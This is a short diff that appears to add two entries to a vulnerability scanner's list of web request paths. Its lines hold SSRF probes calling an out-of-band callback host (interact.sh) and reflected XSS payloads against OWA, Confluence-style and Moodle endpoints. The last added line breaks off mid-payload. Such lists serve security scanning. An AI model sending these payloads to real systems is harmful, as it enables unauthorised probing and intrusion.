@@ -209,3 +209,5 @@
 /Items/RemoteSearch/Image?ImageUrl=http://interact.sh/&ProviderName=TheMovieDB
 /owa/auth/frowny.aspx?app=people&et=ServerError&esrc=MasterPage&te=\&refurl=}}};alert(document.domain)//
 /index.php?explorer/fileView&path=</script><script>alert(document.domain)</script>
+/rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/
+/mod/lti/auth.php?redirect_uri=javascript:alert(
